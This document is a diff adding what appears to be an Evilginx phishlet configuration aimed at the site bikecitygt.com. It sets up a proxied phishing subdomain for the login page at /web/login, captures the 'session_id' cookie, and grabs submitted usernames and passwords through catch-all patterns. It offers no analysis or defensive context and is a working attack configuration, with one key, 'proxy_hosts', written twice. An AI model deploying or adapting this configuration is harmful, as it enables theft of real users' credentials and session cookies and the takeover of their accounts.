@@ -1,0 +1,27 @@
+name: 'BikeCity'
+author: 'Alux'
+min_ver: '3.0.0'
+redirect_url: 'https://www.bikecitygt.com/my'
+
+proxy_hosts:
+proxy_hosts:
+  # Pagina principal
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bikecitygt.com', session: true, is_landing: true}
+auth_tokens:
+  - domain: '.bikecitygt.com'
+    keys: ['session_id']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/my'
+login:
+  domain: 'www.bikecitygt.com'
+  path: '/web/login'
